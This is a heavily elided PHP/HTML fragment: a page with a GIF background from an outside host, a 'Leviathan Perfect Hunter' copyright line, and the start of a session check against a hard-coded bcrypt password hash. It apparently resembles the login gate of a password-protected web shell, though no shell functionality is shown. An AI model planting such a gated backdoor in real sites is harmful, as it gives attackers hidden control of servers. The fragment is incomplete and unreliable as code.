...
<head>
    ...
    <style>
        html {
            background: url('https://pomf2.lain.la/f/tt13nmvp.gif') no-repeat center center fixed;
...
<body><br><br>
    ...
    <center><br>
        ...
        <br><br><br><font class="copyright">&copy; 2023 Leviathan Perfect Hunter</font>
    </center>
</body>
</html>
...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$15$8vyobAlUvwHthuEoCvFxJOFYYHIpvo7YhvDUN9Q3K0sc1We3e1Him'; //
